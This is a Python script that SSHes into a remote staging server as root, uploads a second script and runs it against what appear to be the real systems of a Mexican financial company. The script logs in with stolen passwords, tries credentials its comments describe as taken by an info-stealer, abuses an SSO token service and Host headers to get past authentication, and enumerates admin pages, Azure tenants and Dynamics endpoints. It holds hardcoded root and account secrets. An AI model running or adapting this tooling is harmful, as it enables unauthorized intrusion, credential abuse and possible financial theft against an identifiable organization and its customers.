import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re, base64
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

SSO_URL = "https://sso-jwt-token-service2.tysonprod.com/v1/sso_findep/get_new_token"

def mint(app, svc):
    try:
        r = s.post(SSO_URL, json={"appJwt": app, "serviceName": svc},
            headers={"Content-Type": "application/json"}, timeout=5)
        if r.status_code == 200:
            return r.json().get("token", "")
    except:
        pass
    return ""


# ========================================
# 1. FOOTPRINTS — IS IT A LOGIN SUCCESS?
# ========================================
sys.stdout.write("=" * 60 + "\n=== FOOTPRINTS DEEP ANALYSIS ===\n" + "=" * 60 + "\n\n")

PAO = "https://pao.findep.com.mx"

# Login with bmendezar:Pao1234+
r = s.post(f"{PAO}/MRcgi/MRlogin.pl",
    data={"USERID": "bmendezar", "PASSWORD": "Pao1234+",
          "MRSubmit": "Submit", "PROJECTID": "1"},
    timeout=10, allow_redirects=True)

sys.stdout.write(f"Login response: [{r.status_code}] ({len(r.text)}b)\n")
sys.stdout.write(f"URL final: {r.url}\n")
sys.stdout.write(f"Cookies: {dict(r.cookies)}\n")

# Check for login success/failure indicators
body = r.text
if "invalid" in body.lower() or "error" in body[:1000].lower() or "incorrect" in body.lower():
    sys.stdout.write("LOGIN FAILED (error message found)\n")
elif "logout" in body.lower() or "signout" in body.lower() or "MRhomepage" in body:
    sys.stdout.write("*** LOGIN SUCCESS *** (dashboard found)\n")
else:
    sys.stdout.write("AMBIGUOUS — analyzing content...\n")

# Extract key elements
title = re.search(r'<title>(.*?)</title>', body[:2000], re.I)
sys.stdout.write(f"Title: {title.group(1) if title else 'N/A'}\n")

# Find all links
links = re.findall(r'href=["\']([^"\']+)["\']', body, re.I)
do_links = [l for l in links if 'MRcgi' in l or '.pl' in l or 'MR' in l]
sys.stdout.write(f"\nMR links ({len(do_links)}):\n")
for l in do_links[:30]:
    sys.stdout.write(f"  {l}\n")

# Find forms
forms = re.findall(r'<form[^>]*>(.*?)</form>', body, re.I | re.S)
sys.stdout.write(f"\nForms: {len(forms)}\n")
for i, f in enumerate(forms[:3]):
    action = re.search(r'action=["\']([^"\']+)["\']', f, re.I)
    sys.stdout.write(f"  Form {i}: action={action.group(1) if action else 'N/A'}, size={len(f)}\n")

# Extract JavaScript that might indicate session
js_vars = re.findall(r'var\s+(\w+)\s*=\s*["\']([^"\']+)["\']', body[:5000])
sys.stdout.write(f"\nJS vars: {js_vars[:15]}\n")

# Check for username display (means logged in)
if "bmendezar" in body.lower():
    sys.stdout.write("\n*** USERNAME FOUND IN PAGE — LOGGED IN ***\n")

# Extract frames/iframes
frames = re.findall(r'<(?:i?frame)[^>]+src=["\']([^"\']+)["\']', body, re.I)
sys.stdout.write(f"\nFrames: {frames[:10]}\n")

# Dump first 3000 chars and last 1000 chars
sys.stdout.write(f"\n--- FIRST 3000 CHARS ---\n{body[:3000]}\n")
sys.stdout.write(f"\n--- LAST 1000 CHARS ---\n{body[-1000:]}\n")

# If logged in, navigate to key pages
if "MRhomepage" in body or "bmendezar" in body.lower() or len(body) > 40000:
    sys.stdout.write("\n\n=== EXPLORING FOOTPRINTS ===\n\n")
    
    explore_paths = [
        "/MRcgi/MRhomepage.pl",
        "/MRcgi/MRticketList.pl",
        "/MRcgi/MRadmin.pl",
        "/MRcgi/MRreport.pl",
        "/MRcgi/MRsearch.pl",
        "/MRcgi/MRconfigure.pl",
        "/MRcgi/MRuserSetup.pl",
        "/MRcgi/MRworkspaceSetup.pl",
    ]
    
    for path in explore_paths:
        try:
            r2 = s.get(f"{PAO}{path}", timeout=5, allow_redirects=True)
            title2 = re.search(r'<title>(.*?)</title>', r2.text[:2000], re.I)
            sys.stdout.write(f"  [{r2.status_code}] {path} ({len(r2.text)}b) Title={title2.group(1)[:50] if title2 else 'N/A'}\n")
            if r2.status_code == 200 and len(r2.text) > 500:
                # Check for admin indicators
                if "admin" in r2.text[:2000].lower():
                    sys.stdout.write(f"    HAS ADMIN CONTENT\n")
                # Extract useful links
                inner_links = re.findall(r'href=["\']([^"\']*(?:sql|db|exec|cmd|file|upload|import|export|backup|config|setting|admin)[^"\']*)["\']', r2.text, re.I)
                if inner_links:
                    sys.stdout.write(f"    Interesting links: {inner_links[:10]}\n")
        except:
            pass
        sys.stdout.flush()


# ========================================
# 2. DISPERSION AUTH CRACKING
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== DISPERSION AUTH CRACKING ===\n" + "=" * 60 + "\n\n")

DISP = "https://dispersion-facade-service.tysonbeta.com"

# Check what the 401 response says
r401 = s.get(f"{DISP}/", timeout=5)
sys.stdout.write(f"401 response headers:\n")
for k, v in r401.headers.items():
    sys.stdout.write(f"  {k}: {v}\n")
sys.stdout.write(f"401 body: {r401.text[:500]}\n\n")

# Try different auth methods
sys.stdout.write("--- Different auth methods ---\n\n")

# 1. Istio/Envoy auth — might need specific header
tok = mint("DISPERSION-FACADE", "dispersion-facade-service")
for auth_header in [
    ("Authorization", f"Bearer {tok}"),
    ("X-Auth-Token", tok),
    ("X-JWT-Token", tok),
    ("x-forwarded-access-token", tok),
    ("Cookie", f"token={tok}"),
    ("X-Service-Token", tok),
]:
    try:
        r = s.get(f"{DISP}/health", headers={auth_header[0]: auth_header[1]}, timeout=3)
        if r.status_code != 401:
            sys.stdout.write(f"  *** [{r.status_code}] {auth_header[0]} ({len(r.text)}b) {r.text[:200]}\n")
    except:
        pass

# 2. Different appJwt names for the token
for app_name in [
    "DISPERSION-FACADE-SERVICE", "dispersion-facade-service",
    "DISPERSION", "dispersion",
    "FINDEP-DISPERSION", "AEF-DISPERSION",
    "FISA-DISPERSION", "BACKOFFICE-DISPERSION",
    "TYSON-DISPERSION", "TYSON-BACKOFFICE",
    "CONTABILIDAD", "CONTABILIDAD-SERVICE",
    "POLIZAS", "TRANSFORMACION-POLIZAS",
]:
    tok = mint(app_name, "dispersion-facade-service")
    if tok:
        try:
            r = s.get(f"{DISP}/health",
                headers={"Authorization": f"Bearer {tok}"}, timeout=3)
            if r.status_code != 401:
                sys.stdout.write(f"  *** [{r.status_code}] app={app_name} ({len(r.text)}b) {r.text[:300]}\n")
        except:
            pass
    sys.stdout.flush()

# 3. Basic auth with stealer creds
basic_creds = [
    ("bmendezar", "Findep2021"),
    ("bmendezar", "gf%CX4Ozhej5Tjm"),
    ("admin", "Findep2021"),
    ("ADMIN", "4p5pd2fz4MfAFz9gUEGw4BhzQxisOyriXD0xJUOa6dw="),
    ("ADMIN", "Mb1WhzUUMmsUeq1lm4IWu2T+FCGn9cTT585Vx9uzAls="),
    ("weblogic", "Findep2021"),
]

for u, p in basic_creds:
    try:
        r = s.get(f"{DISP}/health", auth=(u, p), timeout=3)
        if r.status_code != 401:
            sys.stdout.write(f"  *** BASIC [{r.status_code}] {u}:{p[:10]}... ({len(r.text)}b) {r.text[:200]}\n")
    except:
        pass
    sys.stdout.flush()

# 4. Try API key header
for key_name in ["X-Api-Key", "apikey", "x-api-key", "Api-Key", "X-API-KEY"]:
    for key_val in ["Findep2021", "4p5pd2fz4MfAFz9gUEGw4BhzQxisOyriXD0xJUOa6dw=",
                     "Mb1WhzUUMmsUeq1lm4IWu2T+FCGn9cTT585Vx9uzAls="]:
        try:
            r = s.get(f"{DISP}/health", headers={key_name: key_val}, timeout=2)
            if r.status_code != 401:
                sys.stdout.write(f"  *** [{r.status_code}] {key_name}={key_val[:15]}... ({len(r.text)}b)\n")
        except:
            pass

# 5. No auth at all
try:
    r = s.get(f"{DISP}/health", headers={}, timeout=3)
    sys.stdout.write(f"\n  No auth: [{r.status_code}] ({len(r.text)}b) {r.text[:200]}\n")
except:
    pass

# 6. Try calidad-architect domain with same K8s IP for dispersion
K8S = "35.238.21.37"
sys.stdout.write("\n--- K8s direct with dispersion host ---\n")
for host_hdr in [
    "dispersion-facade-service.backoffice.calidad-architect.com",
    "dispersion-facade-service.web.calidad-architect.com",
    "dispersion-facade-service.mesh.calidad-architect.com",
]:
    tok = mint("DISPERSION-FACADE", "dispersion-facade-service")
    try:
        r = s.get(f"https://{K8S}/actuator/mappings",
            headers={"Host": host_hdr, "Authorization": f"Bearer {tok}"},
            timeout=3)
        if r.status_code == 200 and len(r.text) > 100:
            sys.stdout.write(f"  *** MAPPINGS [{r.status_code}] Host:{host_hdr} ({len(r.text)}b)\n")
            sys.stdout.write(f"    {r.text[:3000]}\n\n")
        elif r.status_code != 404 and r.status_code != 401:
            sys.stdout.write(f"  [{r.status_code}] Host:{host_hdr}\n")
    except:
        pass
    sys.stdout.flush()


# ========================================
# 3. FIND THE RIGHT AZURE TENANT
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== AZURE TENANT DISCOVERY ===\n" + "=" * 60 + "\n\n")

# The stealer tenant ID failed. Try discovering the real tenant via OpenID
azure_domains = ["findep.com.mx", "findep.dev", "findep.global",
                 "independencia.com.mx", "findep.mx"]

for domain in azure_domains:
    try:
        r = s.get(f"https://login.microsoftonline.com/{domain}/v2.0/.well-known/openid-configuration",
            timeout=5)
        if r.status_code == 200:
            data = r.json()
            tenant = data.get("token_endpoint", "").split("/")[3] if "token_endpoint" in data else "?"
            sys.stdout.write(f"  {domain}: tenant={tenant}\n")
            sys.stdout.write(f"    issuer: {data.get('issuer', '')}\n\n")
        else:
            sys.stdout.write(f"  {domain}: [{r.status_code}]\n")
    except Exception as e:
        sys.stdout.write(f"  {domain}: ERR {e}\n")
    sys.stdout.flush()

# If we found a valid tenant, try the client_credentials with it
# (will be done in next iteration based on results above)


# ========================================
# 4. DYNAMICS BC ENDPOINTS
# ========================================
sys.stdout.write("\n\n" + "=" * 60 + "\n=== DYNAMICS BC DIRECT ===\n" + "=" * 60 + "\n\n")

# Try standard Dynamics BC URLs
dyn_urls = [
    "https://businesscentral.dynamics.com/findep.global",
    "https://api.businesscentral.dynamics.com/v2.0/findep.global",
    "https://findep.global",
    "https://bc.findep.global",
    "https://nav.findep.global",
    "https://dynamics.findep.global",
]

for url in dyn_urls:
    try:
        r = s.get(url, timeout=5, allow_redirects=False)
        sys.stdout.write(f"  [{r.status_code}] {url}")
        if r.status_code in [301, 302]:
            sys.stdout.write(f" -> {r.headers.get('Location', '')[:100]}")
        elif r.status_code == 200:
            sys.stdout.write(f" ({len(r.text)}b)")
        sys.stdout.write("\n")
    except requests.exceptions.ConnectionError:
        sys.stdout.write(f"  DNS FAIL: {url}\n")
    except:
        pass
    sys.stdout.flush()


sys.stdout.write("\n\n=== ALL DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/fp_disp.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/fp_disp.py 2>&1', timeout=300)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
